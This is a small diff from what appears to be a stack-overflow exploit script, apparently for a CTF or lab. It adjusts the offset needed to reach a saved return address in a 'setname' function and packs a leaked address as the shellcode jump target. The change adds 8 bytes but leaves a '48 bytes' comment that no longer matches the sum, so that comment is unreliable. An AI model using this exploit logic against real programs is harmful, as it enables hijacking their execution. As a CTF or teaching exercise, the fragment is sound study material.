@@ -75,7 +75,7 @@ desired_jump = leak_addr_int - delta
 # Bytes required to get to RIP
 STACK_FRAME_SIZE_SETNAME = 0x30
 RIP = 8
-delta_RSP_RBP_setname = STACK_FRAME_SIZE_SETNAME + RIP + 8 + 8  # 48 bytes
+delta_RSP_RBP_setname = STACK_FRAME_SIZE_SETNAME + RIP + 8 + 8 + 8  # 48 bytes
 
 shellcode_addr = p64(desired_jump, endianness="little")
 print(f"Shellcode address: {hex(desired_jump)}")
